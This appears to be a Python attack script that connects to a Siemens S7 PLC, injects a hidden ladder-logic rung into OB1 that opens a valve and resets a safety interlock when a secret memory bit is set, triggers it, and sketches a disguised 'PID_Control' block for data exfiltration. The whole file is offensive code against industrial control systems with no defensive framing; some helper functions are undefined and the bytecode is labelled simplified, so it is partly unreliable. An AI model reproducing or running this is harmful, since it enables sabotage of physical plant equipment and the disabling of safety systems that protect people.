# ladder_logic_backdoor.py - Inject malicious logic into PLC program
# Works with Siemens S7, Allen-Bradley, etc.

from snap7 import client
import struct

class LadderLogicBackdoor:
    def __init__(self, plc_ip):
        self.plc = client.Client()
        self.plc.connect(plc_ip, 0, 1)

    def inject_hidden_rung(self, ob_number=1):
        """
        Inject hidden rung into Organization Block
        Rung activates on specific memory bit, executes payload
        """
        # Download existing OB1
        ob_data = self.plc.full_upload(snap7.types.Block_OB, ob_number)

        # Decode ladder logic (Siemens MC7 bytecode)
        # MC7 instruction format (simplified):
        # - U M 0.0: Load memory bit M0.0
        # - = Q 4.0: Set output Q4.0

        # Craft backdoor rung (in MC7 bytecode):
        # IF M100.0 (hidden activation bit) THEN
        #     Q4.0 := 1 (open valve)
        #     Q4.1 := 0 (close safety interlock)

        backdoor_rung = bytes([
            0x70, 0x00, 0x64, 0x00,  # U M 100.0 (load hidden bit)
            0x71, 0x82, 0x04, 0x00,  # = Q 4.0 (set output)
            0x72, 0x82, 0x04, 0x01,  # R Q 4.1 (reset safety)
            0x00, 0x00               # BEU (Block End Unconditional)
        ])

        # Insert at end of OB1 (before BEU)
        modified_ob = ob_data[:-2] + backdoor_rung

        # Upload modified OB1
        self.plc.download(snap7.types.Block_OB, ob_number, modified_ob)
        print("[+] Backdoor rung injected into OB1")

    def activate_backdoor(self):
        """Trigger backdoor by setting hidden bit"""
        # Set M100.0 = 1
        self.plc.mb_write(100, 0, bytes([0x01]))
        print("[+] Backdoor activated")

    def create_stealth_function_block(self):
        """
        Create hidden Function Block that appears benign
        FB name: "PID_Control" (looks legitimate)
        Actual behavior: Data exfiltration via Modbus
        """
        # Craft FB in MC7 bytecode
        # Appears to do PID control, but also copies process data to hidden DB
        stealth_fb = self.craft_fb_bytecode()

        # Upload as FB 100
        self.plc.download(snap7.types.Block_FB, 100, stealth_fb)

        # Modify OB1 to call FB100 every cycle
        self.inject_fb_call(ob=1, fb=100)

# Usage
backdoor = LadderLogicBackdoor("192.168.1.10")
backdoor.inject_hidden_rung()
backdoor.activate_backdoor()
